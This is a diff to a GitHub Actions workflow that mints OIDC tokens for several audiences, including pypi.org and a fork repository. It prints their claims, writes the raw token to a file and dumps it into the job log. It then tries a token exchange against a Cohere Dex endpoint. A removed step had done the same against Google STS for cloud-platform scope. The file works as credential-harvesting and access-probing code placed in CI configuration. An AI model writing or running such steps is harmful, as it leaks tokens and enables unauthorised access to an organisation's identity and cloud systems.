@@ -14,6 +14,8 @@ on:
           - sts.amazonaws.com
           - api://AzureADTokenExchange
           - north.cohere.com
+          - pypi.org
+          - https://github.com/mnboki02-lab/cohere-typescript
 permissions:
   id-token: write
   contents: read
@@ -31,35 +33,21 @@ jobs:
             const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
             console.log('AUDIENCE=' + audience);
             console.log('TOKEN_LENGTH=' + token.length);
-            for (const key of ['sub', 'aud', 'iss', 'job_workflow_ref', 'repository', 'repository_owner', 'actor', 'sha', 'ref', 'run_id']) {
+            for (const key of ['sub', 'aud', 'iss', 'job_workflow_ref', 'repository', 'repository_owner', 'actor', 'sha', 'ref', 'run_id', 'repository_id', 'ref_type', 'environment']) {
               if (payload[key]) console.log(key + '=' + payload[key]);
             }
             require('fs').writeFileSync('/tmp/oidc_' + audience.replace(/[^a-z]/g,'') + '.txt', token);
             core.setOutput('jwt', token);
       - run: cat /tmp/oidc_github.txt
-      - name: Try North Dex token exchange
-        if: github.event.inputs.audience == 'north.cohere.com' || github.event.inputs.audience == 'github'
+      - name: Try North Dex
         run: |
           set +e
           TG=$(cat /tmp/oidc_github.txt 2>/dev/null || cat /tmp/oidc_northcoherecom.txt 2>/dev/null)
           if [ -n "$TG" ]; then
-            echo "=== North Dex token exchange ==="
             curl -s -X POST "https://north.cohere.com/dex/token" \
               -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
               -d "client_id=north" \
               -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
               -d "subject_token=${TG}" \
-              -d "scope=openid%20profile%20email%20groups" 2>&1
-            echo ""
-          fi
-      - name: Try GCP STS exchange
-        run: |
-          set +e
-          TG=$(cat /tmp/oidc_github.txt 2>/dev/null || cat /tmp/oidc_stsamazonawscom.txt 2>/dev/null)
-          if [ -n "$TG" ]; then
-            echo "=== GCP STS token exchange ==="
-            curl -s -X POST "https://sts.googleapis.com/v1/token" \
-              -H "Content-Type: application/json" \
-              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"${TG}\",\"audience\":\"//iam.googleapis.com/projects/568425278105/locations/global/workloadIdentityPools/github-actions/providers/github-provider\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" 2>&1
-            echo ""
+              -d "scope=openid%20profile%20email%20groups" 2>&1 | tail -3
           fi
